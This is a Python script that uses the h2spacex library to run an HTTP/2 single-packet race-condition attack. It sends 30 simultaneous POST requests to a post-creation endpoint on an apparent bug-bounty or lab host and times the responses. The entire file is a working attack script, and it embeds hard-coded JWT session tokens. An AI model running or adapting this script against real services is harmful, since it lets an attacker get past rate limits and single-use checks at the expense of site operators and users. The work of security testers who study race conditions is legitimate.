from time import sleep

from h2spacex import H2OnTlsConnection, h2_frames

h2_conn = H2OnTlsConnection(
	hostname="4900a32e-0c55-4692-9036-a85d3395a8c0.bugg.cc", port_number=443
)

headers = """Accept: */*
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate, br
Content-Type: application/json
Content-Length: 30
Origin: http://4900a32e-0c55-4692-9036-a85d3395a8c0.bugg.cc
Cookie: refreshtoken=eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJleHAiOjE3MjUxNjY2NjIsImlhdCI6MTcyNTA4MDI2MiwidXNlcm5hbWUiOiJ0ZXN0MiIsInV1aWQiOiIyYThlZWNhYi03MmIzLTQxZWUtYTZiMS04NzIwZTI4ODFmNTYifQ.UemLJAJPuxxAVWxpR7m3UtnNViVCDSPk4KuDwTIz-Ek; accesstoken=eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJleHAiOjE3MjUwODA4NjIsImlhdCI6MTcyNTA4MDI2Miwicm9sZSI6InVzZXIiLCJ1c2VybmFtZSI6InRlc3QyIn0.amu3y8j4PeGCjIc4l_OQ5aV_giLkD4aoPe7Vhh8Cor8
"""

body = """{"title":"test","data":"test"}
"""
stream_ids_list = h2_conn.generate_stream_ids(number_of_streams=30)

all_headers_frames = []  # all headers frame + data frames which have not the last byte
all_data_frames = []  # all data frames which contain the last byte

for s_id in stream_ids_list:
	header_frames_without_last_byte, last_data_frame_with_last_byte = (
		h2_conn.create_single_packet_http2_post_request_frames(
			method="POST",
			headers_string=headers,
			scheme="https",
			stream_id=s_id,
			authority="4900a32e-0c55-4692-9036-a85d3395a8c0.bugg.cc",
			body=body,
			path="/user/posts/create",
		)
	)

	all_headers_frames.append(header_frames_without_last_byte)
	all_data_frames.append(last_data_frame_with_last_byte)

# concatenate all headers bytes
temp_headers_bytes = b""
for h in all_headers_frames:
	temp_headers_bytes += bytes(h)

# concatenate all data frames which have last byte
temp_data_bytes = b""
for d in all_data_frames:
	temp_data_bytes += bytes(d)

h2_conn.setup_connection()
h2_conn.send_ping_frame()  # important line (in improved version of single packet attack)

# send header frames
h2_conn.send_frames(temp_headers_bytes)

# wait some time
sleep(0.1)

# send ping frame to warm up connection
h2_conn.send_ping_frame()

# send remaining data frames
h2_conn.send_frames(temp_data_bytes)

h2_conn.start_thread_response_parsing(_timeout=3)
while not h2_conn.is_threaded_response_finished:
	sleep(1)

if h2_conn.is_threaded_response_finished is None:
	print("Error has occurred!")
	exit()

frame_parser = h2_conn.threaded_frame_parser

h2_conn.close_connection()

for x in frame_parser.headers_and_data_frames.keys():
	sid = str(x)
	d = frame_parser.headers_and_data_frames[x]
	print(f'Stream ID: {sid}, response nano seconds: {d["nano_seconds"]}')
	print(f'Headers: {str(d["header"])}')
	print(f'Body (DATA): {str(d["data"])}')
